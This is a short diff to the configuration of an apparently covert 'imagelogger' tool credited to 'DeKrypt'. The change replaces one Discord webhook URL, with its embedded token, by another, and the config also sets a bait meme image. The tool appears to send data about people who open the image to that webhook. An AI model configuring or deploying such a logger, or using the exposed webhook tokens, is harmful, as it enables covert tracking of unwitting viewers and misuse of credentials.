@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1492312936113504417/kBoez0ZfDh3YfupYIihc0IVFHORn6au1UI1uosEsR2BBZbmawPmjXbiyn0o08CRALsDL",
+    "webhook": "https://discord.com/api/webhooks/1526354884591485021/fg4Uu4DJNR__dHezS76q-1YPBia7zijeORrHdySMD9zRggZZN68HdGKXQdMg8DhPlPk8",
     "image": "https://www.pngitem.com/pimgs/m/184-1845412_shrek-meme-png-transparent-png.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
